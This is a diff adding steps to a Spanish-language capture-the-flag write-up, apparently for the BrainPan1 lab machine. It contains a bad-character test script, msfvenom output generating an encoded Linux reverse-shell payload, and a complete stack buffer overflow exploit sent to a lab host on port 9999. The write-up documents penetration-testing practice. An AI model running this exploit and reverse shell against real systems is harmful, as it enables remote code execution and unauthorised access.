@@ -183,4 +183,91 @@ s.recv(1024)
 s.close()
 ```
 
+### Detectando BADCHARS
+```
+import sys, socket
+import struct
+
+badchars = ["\x00"]
+gutchars = "".join([chr(x) for x in xrange(0, 256) if chr(x) not in badchars])
+
+buf = "A" * 524
+ret = struct.pack("I", 0x311712F3)
+nops = "\x90" * 32
+shell = "\xCC" + gutchars
+
+payload = buf + ret + nops + shell
+
+target = ('127.0.0.1', 9999)
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(target)
+s.recv(1024)
+s.send(payload)
+s.recv(1024)
+s.close()
+```
+<img src="https://github.com/El-Palomo/BrainPan1/blob/main/brain8.jpg" width="60%"></img>
+
+
+### SHELLCODE
+```
+root@kali:~# msfvenom -p linux/x86/shell_reverse_tcp -b "\x00" LHOST=192.168.78.131 LPORT=4444 -e x86/shikata_ga_nai -f python
+[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+Found 1 compatible encoders
+Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size 95 (iteration=0)
+x86/shikata_ga_nai chosen with final size 95
+Payload size: 95 bytes
+Final size of python file: 479 bytes
+buf =  b""
+buf += b"\xdb\xd6\xba\x45\x05\x78\xef\xd9\x74\x24\xf4\x5e\x2b"
+buf += b"\xc9\xb1\x12\x31\x56\x17\x03\x56\x17\x83\xab\xf9\x9a"
+buf += b"\x1a\x02\xd9\xac\x06\x37\x9e\x01\xa3\xb5\xa9\x47\x83"
+buf += b"\xdf\x64\x07\x77\x46\xc7\x37\xb5\xf8\x6e\x31\xbc\x90"
+buf += b"\xb0\x69\x70\xe3\x59\x68\x8d\xf2\xc5\xe5\x6c\x44\x93"
+buf += b"\xa5\x3f\xf7\xef\x45\x49\x16\xc2\xca\x1b\xb0\xb3\xe5"
+buf += b"\xe8\x28\x24\xd5\x21\xca\xdd\xa0\xdd\x58\x4d\x3a\xc0"
+buf += b"\xec\x7a\xf1\x83"
+```
+El exploit final queda de la siguiente manera:
+Lo ejecuto desde Kali:
+```
+import sys, socket
+import struct
+
+buf =  b""
+buf += b"\xdb\xd6\xba\x45\x05\x78\xef\xd9\x74\x24\xf4\x5e\x2b"
+buf += b"\xc9\xb1\x12\x31\x56\x17\x03\x56\x17\x83\xab\xf9\x9a"
+buf += b"\x1a\x02\xd9\xac\x06\x37\x9e\x01\xa3\xb5\xa9\x47\x83"
+buf += b"\xdf\x64\x07\x77\x46\xc7\x37\xb5\xf8\x6e\x31\xbc\x90"
+buf += b"\xb0\x69\x70\xe3\x59\x68\x8d\xf2\xc5\xe5\x6c\x44\x93"
+buf += b"\xa5\x3f\xf7\xef\x45\x49\x16\xc2\xca\x1b\xb0\xb3\xe5"
+buf += b"\xe8\x28\x24\xd5\x21\xca\xdd\xa0\xdd\x58\x4d\x3a\xc0"
+buf += b"\xec\x7a\xf1\x83"
+shellcode = buf
+
+buf = "A" * 524
+ret = struct.pack("I", 0x311712F3)
+nops = "\x90" * 32
+#shell = "\xCC" + gutchars
+
+payload = buf + ret + nops + shellcode
+
+target = ('192.168.78.134', 9999)
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(target)
+s.recv(1024)
+s.send(payload)
+s.recv(1024)
+s.close()
+```
+<img src="https://github.com/El-Palomo/BrainPan1/blob/main/brain9.jpg" width="60%"></img>
+
+
+
+
+
+
+
 
